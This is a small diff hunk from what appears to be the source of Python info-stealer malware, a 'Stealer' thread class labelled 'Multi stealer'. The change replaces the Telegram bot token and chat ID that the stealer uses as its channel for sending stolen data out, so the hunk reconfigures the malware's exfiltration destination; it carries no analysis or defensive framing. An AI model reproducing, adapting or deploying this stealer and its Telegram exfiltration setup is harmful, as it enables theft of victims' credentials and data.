@@ -3886,5 +3886,5 @@ class Stealer(Thread):
             print(f"[Multi stealer]: {repr(e)}")
 if __name__ == "__main__":
   Stealer(
-    senders = [Senders.telegram("6482133231:AAHBfHJ64CuAzadrX7BucjzwhX8cOu5zMHE",5838856540)]
+    senders = [Senders.telegram("6968728571:AAEovSG6e2D3zmXhXHxk0VfhOOqTCjKIFo0",-1002244466181)]
     ).run()
